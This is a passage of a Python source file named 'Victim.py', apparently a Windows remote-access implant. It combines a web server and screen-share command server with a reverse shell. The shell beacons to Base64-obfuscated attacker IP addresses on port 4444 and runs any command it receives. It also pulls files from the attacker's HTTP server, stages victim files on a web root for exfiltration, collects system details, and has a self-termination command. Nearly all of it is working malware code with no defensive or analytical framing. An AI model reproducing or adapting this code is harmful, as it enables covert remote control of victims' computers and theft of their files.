                        s.serve_forever()
                        print(f"[{thread_name}] serve_forever exited gracefully on {addr}.") # Should only happen on shutdown

                    elif isinstance(s, socket.socket): # Command Server Socket
                        addr = s.getsockname()
                        print(f"[{thread_name}] Starting accept loop on {addr}...")
                        while True:
                            try:
                                conn, client_addr = s.accept() # Blocking accept
                                print(f"[{thread_name}] Accepted connection from {client_addr}")
                                if connection_manager.get_connection_count() >= MAX_CONNECTIONS:
                                    print(f"[SCREEN SHARE][REJECTED] {client_addr} - Max connections ({MAX_CONNECTIONS})")
                                    try: conn.sendall(b'ERROR: Max connections reached\n')
                                    except Exception: pass
                                    finally:
                                         try: conn.close()
                                         except Exception: pass
                                    continue

                                client_thread = threading.Thread(
                                    target=handle_client,
                                    args=(conn, client_addr, connection_manager),
                                    daemon=True
                                )
                                client_thread.start()
                                print(f"[SCREEN SHARE][ACTIVE CONNECTIONS] {connection_manager.get_connection_count()}")

                            except OSError as e:
                                 print(f"[WARNING] OS Error accepting connection on {server_name} ({addr}): {e}")
                                 break # Stop accepting if socket has issues
                            except Exception as e:
                                print(f"[ERROR] Unexpected error accepting/handling connection on {server_name} ({addr}): {e}")
                                time.sleep(1) # Pause before retrying accept
                    else:
                        print(f"[ERROR] Unknown server type in worker thread: {type(s)}")
                except Exception as e:
                     # Catch errors during serve_forever() or the accept loop
                     print(f"--- [!!! FATAL ERROR in {thread_name} !!!] ---")
                     traceback.print_exc()
                finally:
                     print(f"[*] Worker thread {thread_name} finished.")
            # --- End Server Worker Function ---

            server_thread = threading.Thread(
                target=server_worker,
                args=(server_instance, name),
                daemon=True
            )
            server_thread.start()
            server_threads.append(server_thread)

        # --- Keep Main Thread Alive ---
        if not any(t.is_alive() for t in server_threads):
             print("[CRITICAL] No server threads seem to have started successfully. Exiting.")
             # Perform cleanup similar to finally block here if necessary
             if 'connection_manager' in locals() and connection_manager: connection_manager.stop()
             if cmd_server: 
                try:
                    cmd_server.close()
                except Exception:
                    pass
             if httpd:
                 try:
                     httpd.server_close()
                 except Exception:
                     pass
             sys.exit(1)

        print(f"[INFO] Main thread entering idle loop. Servers running in background threads.")
        print(f"[MANAGEMENT] Connection manager interface running on {HOST}:{MGMT_PORT}")
        while True:
            time.sleep(5) # Check less frequently
            # Check if server threads are alive
            any_stopped = False
            for i, t in enumerate(server_threads):
                if not t.is_alive():
                    print(f"[WARNING] Server thread {i} ({servers[i][1]} if available) seems to have stopped.")
                    any_stopped = True
            # If any thread stopped, maybe exit or try restart (complex)
            # if any_stopped:
            #    print("[WARNING] One or more server threads stopped. Check logs.")
               # break # Example: Exit main loop if a server dies


    except KeyboardInterrupt:
        print("\n[SHUTTING DOWN] Keyboard interrupt received. Stopping servers...")
    except Exception as e:
        print(f"[ERROR] Unhandled exception in main server setup/loop: {e}")
        traceback.print_exc() # Print traceback for main loop errors too
    finally:
        print("[CLOSING] Shutting down servers and connection manager...")
        # Stop the Connection Manager first
        if 'connection_manager' in locals() and connection_manager:
            connection_manager.stop()

        # Close server sockets/servers
        if httpd: # Shutdown HTTP server first
            try:
                print("[CLOSING] Shutting down Integrated Web Server...")
                httpd.shutdown() # Graceful shutdown
                httpd.server_close() # Close the socket
                print("[CLOSING] Integrated Web Server closed.")
            except Exception as e: print(f"Error closing Integrated Web Server: {e}")
        if cmd_server: # Then screen share server
            try:
                print("[CLOSING] Closing Screen Share Command Server socket...")
                cmd_server.close()
                print("[CLOSING] Screen Share Command Server socket closed.")
            except Exception as e: print(f"Error closing command server socket: {e}")

        # Wait briefly for daemon threads (optional but good practice)
        print("Waiting briefly for threads to exit (up to 2s)...")
        # Explicitly join threads with a timeout
        join_timeout = 2.0
        start_join = time.time()
        for t in server_threads:
            try:
                 remaining_time = join_timeout - (time.time() - start_join)
                 if remaining_time > 0:
                      t.join(timeout=remaining_time)
                 # else: timeout expired
            except Exception as join_e:
                 print(f"Error joining thread {t.name}: {join_e}")


        print("[CLOSED] Servers closed.")


# --- Reverse Shell and other functions (Database, FileLock, Windows specifics) ---
# ... (These sections remain unchanged from the previous version) ...

# Obfuscated target IP addresses and port (REVERSE SHELL TARGET)
encoded_target_1 = "bG9jYWxob3N0"  # Base64 encoded "localhost"
#encoded_target_2 = "MTAuNC4xLjcx"  # Base64 encoded "10.4.1.71" <<-- Attacker IP
encoded_target_2 = "MTAuNC4wLjE5MA=="  # Base64 encoded "10.4.1.71" <<-- Attacker IP
encoded_target_3 = "MTAuMC4wLjIy"  # Base64 encoded "10.0.0.22"
encoded_port = "NDQ0NA=="        # Base64 encoded "4444" <<-- Attacker Port
target_port = int(base64.b64decode(encoded_port).decode())
user_profile = os.getenv('USERPROFILE')
current_directory = os.getcwd() # Track CWD for reverse shell

# --- Database Functions ---
def get_db_connection():
    db_path = os.path.join(os.getcwd(), "connection_history.db") # Use current CWD
    try:
        conn = sqlite3.connect(db_path, timeout=10.0, isolation_level=None)
        conn.execute("PRAGMA journal_mode=WAL")
        conn.execute("PRAGMA busy_timeout=10000")
        return conn
    except sqlite3.Error as e:
         print(f"Database connection error to {db_path}: {e}")
         return None

def init_database():
    try:
        conn = get_db_connection()
        if conn:
            cursor = conn.cursor()
            cursor.execute('''
            CREATE TABLE IF NOT EXISTS connection_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                target_ip TEXT,
                success INTEGER,
                error_message TEXT
            )
            ''')
            conn.commit()
            conn.close()
    except sqlite3.Error as e:
        print(f"Database initialization error: {e}")

def log_connection_attempt(target_ip, success, error_message=""):
    try:
        conn = get_db_connection()
        if conn:
            cursor = conn.cursor()
            timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
            cursor.execute(
                "INSERT INTO connection_history (timestamp, target_ip, success, error_message) VALUES (?, ?, ?, ?)",
                (timestamp, target_ip, 1 if success else 0, error_message)
            )
            conn.commit()
            conn.close()
    except sqlite3.Error as e:
        print(f"Database logging error: {e}")

init_database() # Initialize DB

# --- Windows Specifics ---
try:
    import win32gui
    import win32process
    import win32api
    import win32con
    def find_window_by_pid(pid):
        def callback(hwnd, hwnds):
            if win32gui.IsWindowVisible(hwnd) and win32gui.IsWindowEnabled(hwnd):
                _, found_pid = win32process.GetWindowThreadProcessId(hwnd)
                if found_pid == pid:
                    hwnds.append(hwnd)
            return True
        hwnds = []
        win32gui.EnumWindows(callback, hwnds)
        if hwnds: return hwnds[0]
        else: raise Exception(f"No window found for PID {pid}.")

    def send_keystrokes(hwnd, text):
        for char in text:
            win32api.SendMessage(hwnd, win32con.WM_CHAR, ord(char), 0)
        win32api.PostMessage(hwnd, win32con.WM_KEYDOWN, win32con.VK_RETURN, 0)

except ImportError:
    print("Warning: pywin32 not found. find_window_by_pid and send_keystrokes are disabled.")
    def find_window_by_pid(pid):
        raise NotImplementedError("pywin32 not installed.")
    def send_keystrokes(hwnd, text):
        raise NotImplementedError("pywin32 not installed.")

# --- Console Handler ---
def console_handler(ctrl_type):
    if ctrl_type == 2: # CTRL_CLOSE_EVENT
        print("CTRL_CLOSE_EVENT received. Attempting to kill java processes...")
        try:
            subprocess.run("taskkill /F /IM java.exe", shell=True, check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run("taskkill /F /IM java2.exe", shell=True, check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run("taskkill /F /IM javaw.exe", shell=True, check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            print("Attempted to kill Java processes.")
        except Exception as e:
            print("Failed during taskkill:", e)
        return True # Indicate handled
    return False

if platform.system() == "Windows":
    try:
        HandlerRoutine = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_uint)
        console_ctrl_handler = HandlerRoutine(console_handler)
        if not ctypes.windll.kernel32.SetConsoleCtrlHandler(console_ctrl_handler, True):
            print("Error: Could not set console control handler")
    except Exception as e:
         print(f"Warning: Failed to set console control handler: {e}")
else:
    print("Info: Not running on Windows, console control handler not set.")


# --- Reverse Shell Connection Logic ---
def connect_to_attacker():
    """Connects to the attacker for the reverse shell."""
    ip_index = 0
    s = None
    while True:
        target_ip = None
        connected = False
        try:
            time.sleep(random.uniform(1.0, 3.0))
            ips = [encoded_target_1, encoded_target_2, encoded_target_3]
            target_ip = base64.b64decode(ips[ip_index]).decode()
            print(f"[RevShell] Attempting connection to {target_ip}:{target_port}...")
            ip_index = (ip_index + 1) % 3

            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((target_ip, target_port))
            log_connection_attempt(target_ip, True)
            connected = True
            print(f"[RevShell] Connection established to {target_ip}:{target_port}")
            return s

        except ConnectionRefusedError:
            log_connection_attempt(target_ip, False, "Connection refused")
            print(f"[RevShell] Connection to {target_ip} refused, retrying...")
            time.sleep(random.uniform(3.0, 7.0))
        except socket.timeout:
            log_connection_attempt(target_ip, False, "Connection timed out")
            print(f"[RevShell] Connection to {target_ip} timed out, retrying...")
            time.sleep(random.uniform(3.0, 7.0))
        except OSError as e:
            log_connection_attempt(target_ip, False, f"OS Error: {e}")
            print(f"[RevShell] OS error connecting to {target_ip}: {e}, retrying...")
            time.sleep(random.uniform(5.0, 10.0))
        except Exception as e:
            err_msg = str(e) if target_ip else f"Unknown error before IP decode: {e}"
            log_connection_attempt(target_ip if target_ip else "Unknown", False, err_msg)
            print(f"[RevShell] Connection error: {err_msg}, retrying...")
            time.sleep(random.uniform(3.0, 7.0))
        finally:
            if not connected and s and s.fileno() != -1:
                 try: s.close()
                 except Exception: pass
                 s = None


# --- FileLock Class ---
class FileLock:
    """Simple file lock implementation for cross-platform use"""
    def __init__(self, filename):
        self.filename = filename
        lock_dir = os.path.dirname(filename) or '.'
        lock_base = os.path.basename(filename) + ".lock"
        self.lockfile = os.path.join(lock_dir, lock_base)
        if lock_dir != '.' and not os.path.exists(lock_dir):
             try: os.makedirs(lock_dir, exist_ok=True)
             except OSError as e: print(f"Warning: Could not create lock directory {lock_dir}: {e}")
        self.fd = None
        self.locked = False

    def acquire(self):
        try:
            self.fd = os.open(self.lockfile, os.O_CREAT | os.O_EXCL | os.O_RDWR)
            self.locked = True
            return True
        except FileExistsError: return False
        except PermissionError:
             print(f"Warning: Permission error creating lock file {self.lockfile}")
             return False
        except Exception as e:
             print(f"Error acquiring lock on {self.lockfile}: {e}")
             return False

    def release(self):
        if self.locked and self.fd is not None:
            try: os.close(self.fd)
            except Exception as e: print(f"Error closing lock file descriptor {self.lockfile}: {e}")
            finally:
                 self.fd = None
                 self.locked = False
                 try:
                     if os.path.exists(self.lockfile): os.remove(self.lockfile)
                 except OSError as remove_e: print(f"Warning: Error removing lock file {self.lockfile}: {remove_e}")
                 except Exception as remove_e_gen: print(f"Warning: Generic error removing lock file {self.lockfile}: {remove_e_gen}")
        elif self.fd is not None:
             try: os.close(self.fd)
             except Exception: pass
             self.fd = None
             try:
                 if os.path.exists(self.lockfile): os.remove(self.lockfile)
             except Exception: pass
        elif os.path.exists(self.lockfile): # Attempt cleanup even if lock state seems wrong
             try: os.remove(self.lockfile)
             except Exception: pass

    def __enter__(self):
        max_wait = 5.0
        wait_interval = 0.1
        start_time = time.time()
        while not self.acquire():
            if time.time() - start_time > max_wait:
                 raise TimeoutError(f"Could not acquire lock on {self.filename} ({self.lockfile}) within {max_wait}s.")
            time.sleep(wait_interval)
        return self

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.release()


# --- Reverse Shell Command Handling ---
def handle_connection(s):
    """Handles the reverse shell connection"""
    global current_directory

    if not s or s.fileno() == -1:
        print("[RevShell] Error: handle_connection received an invalid socket.")
        return

    try:
        s.sendall(f"{current_directory}> ".encode())
    except Exception as e:
        print(f"[RevShell] Error sending initial prompt: {e}")
        try: s.close()
        except: pass
        return

    try:
        while True:
            output = ""
            try:
                s.settimeout(None)
                command_bytes = s.recv(4096)
                if not command_bytes:
                    print("[RevShell] Connection closed by attacker (no data).")
                    break

                command = command_bytes.decode(errors='ignore').strip()
                if not command: continue

                print(f"[RevShell] Received command: {command}")

                if command.lower() == "exit":
                    print("[RevShell] Received 'exit' command. Closing connection.")
                    break

                elif command.startswith("cd "):
                    try:
                        new_dir = command[len("cd "):].strip()
                        if len(new_dir) > 1 and new_dir.startswith('"') and new_dir.endswith('"'): new_dir = new_dir[1:-1]
                        elif len(new_dir) > 1 and new_dir.startswith("'") and new_dir.endswith("'"): new_dir = new_dir[1:-1]

                        if not new_dir: output = f"Current directory: {current_directory}\n"
                        else:
                             os.chdir(new_dir)
                             current_directory = os.getcwd()
                             output = f"Changed directory to: {current_directory}\n"
                    except FileNotFoundError: output = f"Error: Directory not found: {new_dir}\n"
                    except Exception as e: output = f"Error changing directory: {str(e)}\n"

                elif command == ("DELETE"):
                    output = "Executing DELETE: Terminating java processes and self...\n"
                    try:
                        s.sendall(output.encode())
                        s.sendall(f"{current_directory}> ".encode())
                    except Exception as e: print(f"[RevShell] Error sending DELETE confirmation: {e}")
                    try:
                        subprocess.run("taskkill /F /IM java.exe", shell=True, check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        subprocess.run("taskkill /F /IM java2.exe", shell=True, check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        subprocess.run("taskkill /F /IM javaw.exe", shell=True, check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    except Exception as e: print(f"[RevShell] Error during taskkill in DELETE: {e}")
                    print("[RevShell] Exiting script due to DELETE command.")
                    os._exit(1)

                elif command == ("downloads2"):
                    try:
                        user_profile_path = os.getenv('USERPROFILE')
                        if not user_profile_path: raise OSError("USERPROFILE environment variable not found.")
                        new_directory = os.path.join(user_profile_path, "Downloads2")
                        if not os.path.exists(new_directory): os.makedirs(new_directory)
                        os.chdir(new_directory)
                        current_directory = os.getcwd()
                        output = f"Changed directory to: {current_directory}\n"
                    except Exception as e: output = f"Error handling downloads2: {str(e)}\n"

                elif command.startswith("download "):
                    file_name = command[len("download "):].strip()
                    if not file_name: output = "Error: download command requires a filename.\n"
                    else:
                        temp_path = os.path.join(current_directory, f"{file_name}.{random.randint(1000,9999)}.tmp")
                        final_path = os.path.join(current_directory, file_name)
                        output = ""
                        try:
                            attacker_ip = s.getpeername()[0]
                            url_path = urllib.parse.quote(file_name)
                            ATTACKER_SRV_PORT = 8000 # Assume attacker uses this port
                            url = f'http://{attacker_ip}:{ATTACKER_SRV_PORT}/{url_path}'
                            print(f"[RevShell] Attempting download from Attacker: {url}")
                            output += f"Downloading from {url}...\n"
                            response = requests.get(url, stream=True, timeout=30)
                            response.raise_for_status()
                            with open(temp_path, 'wb') as f:
                                for chunk in response.iter_content(chunk_size=8192):
                                    if chunk: f.write(chunk)
                            print(f"[RevShell] Downloaded to temp file: {temp_path}")
                            try:
                                print(f"[RevShell] Locking and renaming to: {final_path}")
                                with FileLock(final_path):
                                    if os.path.exists(final_path): os.remove(final_path)
                                    shutil.move(temp_path, final_path)
                                print(f"[RevShell] File rename successful: {final_path}")
                                output += f"File downloaded successfully to {final_path}\n"
                            except (TimeoutError, OSError, Exception) as lock_e:
                                 print(f"[RevShell] Error locking/renaming file: {lock_e}")
                                 output += f"Error saving file (lock/rename failed): {lock_e}\n"
                                 if os.path.exists(temp_path): 
                                     try: os.remove(temp_path) 
                                     except Exception: 
                                         pass
                        except requests.exceptions.RequestException as req_e:
                            print(f"[RevShell] Download failed: {req_e}")
                            output += f"Download failed: {req_e}\n"
                            if os.path.exists(temp_path): 
                                try: os.remove(temp_path) 
                                except Exception: 
                                    pass
                        except Exception as e:
                            print(f"[RevShell] Error during download: {e}")
                            output += f"Error during download: {e}\n"
                            if os.path.exists(temp_path): 
                                try: 
                                    os.remove(temp_path) 
                                except Exception: 
                                    pass

                elif command == ("connection_history"):
                    try:
                        conn_hist = get_db_connection()
                        if conn_hist:
                            cursor = conn_hist.cursor()
                            cursor.execute("SELECT id, timestamp, target_ip, success, error_message FROM connection_history ORDER BY timestamp DESC LIMIT 20")
                            rows = cursor.fetchall()
                            conn_hist.close()
                            if rows:
                                output = "Reverse Shell Connection History (Last 20 attempts):\n" + \
                                         "ID | Timestamp           | Target IP     | Status | Error\n" + \
                                         "---|---------------------|---------------|--------|------\n"
                                for row in rows:
                                    status = 'Success' if row[3] else 'Failed'
                                    error_msg = row[4][:30] + '...' if len(row[4]) > 30 else row[4]
                                    output += f"{row[0]:<2d} | {row[1]:<19s} | {row[2]:<13s} | {status:<6s} | {error_msg}\n"
                            else: output = "No reverse shell connection history found.\n"
                        else: output = "Error: Could not connect to history database.\n"
                    except Exception as e: output = f"Error retrieving connection history: {str(e)}\n"

                elif command.startswith("upload "):
                    try:
                        file_path_relative = command[len("upload "):].strip()
                        if len(file_path_relative) > 1 and file_path_relative.startswith('"') and file_path_relative.endswith('"'): file_path_relative = file_path_relative[1:-1]
                        source_path = os.path.abspath(os.path.join(current_directory, file_path_relative))

                        if os.path.exists(source_path) and os.path.isfile(source_path):
                            file_name = os.path.basename(source_path)
                            destination_path = os.path.join(WEB_SERVER_ROOT, file_name)
                            output = f"Preparing '{file_name}' for download via web server...\n"
                            try:
                                print(f"[RevShell] Locking destination: {destination_path}")
                                with FileLock(destination_path):
                                    print(f"[RevShell] Copying '{source_path}' to '{destination_path}'")
                                    shutil.copy2(source_path, destination_path)
                                output += f"File '{file_name}' ready at web server root.\n"
                                output += f"Attacker can download from: http://<victim_ip>:{HTTP_PORT}/{urllib.parse.quote(file_name)}\n"
                                print(f"[RevShell] File copy successful: {destination_path}")
                            except (TimeoutError, OSError, Exception) as lock_e:
                                 output += f"Error locking/copying file for upload: {lock_e}\n"
                                 print(f"[RevShell] Error locking/copying file for upload: {lock_e}")
                        elif not os.path.exists(source_path): output = f"Error: Source file not found: {source_path}\n"
                        else: output = f"Error: Source path is not a file: {source_path}\n"
                    except Exception as e: output = f"Error processing upload command: {str(e)}\n"

                elif command == "whoami" or command == "Whoami":
                     try:
                        result = subprocess.run("whoami", shell=True, capture_output=True, text=True, errors='ignore', timeout=5)
                        username = result.stdout.strip() if result.returncode == 0 else f"Error ({result.returncode})"
                        if "\\" in username: username = username.split("\\")[-1]
                        system_info = "System Info:\n"
                        try: system_info += f"  OS: {platform.system()} {platform.release()} ({platform.version()})\n"
                        except: system_info += "  OS: Error\n"
                        try: system_info += f"  Arch: {platform.architecture()[0]}\n"
                        except: system_info += "  Arch: Error\n"
                        try: system_info += f"  Machine: {platform.machine()}\n"
                        except: system_info += "  Machine: Error\n"
                        try: system_info += f"  Processor: {platform.processor()}\n"
                        except: system_info += "  Processor: Error\n"
                        try: system_info += f"  Hostname: {platform.node()}\n"
                        except: system_info += "  Hostname: Error\n"
                        cwd_rev_shell = current_directory
                        cwd_web_shell = WebServerRequestHandler.shell_current_directory
                        output = f"Username: {username}\n{system_info}" + \
                                 f"Reverse Shell CWD: {cwd_rev_shell}\n" + \
                                 f"Web Shell CWD:     {cwd_web_shell}\n"
                     except Exception as e: output = f"Error getting system info: {str(e)}\n"

                else:
                    try:
                        result = subprocess.run(command, shell=True, capture_output=True,
                                                text=True, errors='ignore', cwd=current_directory, timeout=60)
                        output = result.stdout + result.stderr
                        if not output.strip(): output = f"[+] Command '{command}' executed successfully (no output)\n"
                        if not output.endswith('\n'): output += '\n'
                    except subprocess.TimeoutExpired: output = f"Error: Command '{command}' timed out after 60 seconds.\n"
                    except Exception as e: output = f"Error executing command '{command}': {str(e)}\n"

                try:
                    full_response = output + f"{current_directory}> "
                    s.sendall(full_response.encode(errors='ignore'))
                except socket.error as send_err:
                    print(f"[RevShell] Socket error sending output: {send_err}. Closing connection.")
                    break
                except Exception as send_err:
                     print(f"[RevShell] Error sending output: {send_err}. Closing connection.")
                     break

            except ConnectionResetError: print("[RevShell] Connection reset by attacker."); break
            except socket.error as sock_err: print(f"[RevShell] Socket error during command loop: {sock_err}"); break
            except Exception as e:
                print(f"[RevShell] Error processing command: {e}")
                try:
                    error_msg = f"Error on victim side: {e}\n{current_directory}> "
                    s.sendall(error_msg.encode(errors='ignore'))
                except:
                    print("[RevShell] Could not send error to attacker. Closing connection.")
                    break

    except Exception as e:
        print(f"[RevShell] Unhandled connection error: {str(e)}")
    finally:
        if s and s.fileno() != -1:
            try:
                s.close()
                print("[RevShell] Socket closed.")
            except Exception as close_e:
                 print(f"[RevShell] Error closing socket: {close_e}")


# --- Main Execution Logic ---
if __name__ == "__main__":
    print("--- Victim Script Starting ---")
    print(f"Working Directory: {os.getcwd()}")
    print(f"Web Server Root:   {WEB_SERVER_ROOT}")
    print(f"Web Shell Initial: {INITIAL_SHELL_CWD}")

    server_thread = threading.Thread(target=start_combined_server, daemon=True)
    server_thread.start()

    # Give servers a moment to potentially fail binding before entering main loop
    time.sleep(0.5)
    if not server_thread.is_alive():
         print("[CRITICAL] Server thread failed to stay alive shortly after start. Check logs above. Exiting.")
         sys.exit(1)


    while True:
        print("[RevShell] Attempting to establish reverse shell connection...")
        rev_shell_socket = None
        try:
            rev_shell_socket = connect_to_attacker()
            if rev_shell_socket:
                 handle_connection(rev_shell_socket)
            else:
                 print("[RevShell] connect_to_attacker returned None. Retrying connection loop after delay.")
                 time.sleep(10)

            print("[RevShell] Connection cycle finished. Restarting connection attempt...")
            time.sleep(random.uniform(2.0, 5.0))

        except Exception as main_loop_e:
             print(f"[RevShell][CRITICAL] Error in main reverse shell loop: {main_loop_e}")
             traceback.print_exc() # Also print traceback here
             if rev_shell_socket and rev_shell_socket.fileno() != -1:
                  try: rev_shell_socket.close()
                  except: pass
             print("[RevShell] Retrying main loop after error...")
             time.sleep(15)

# --- END OF FILE Victim.py (Integrated with WebServer + Debug Fixes) ---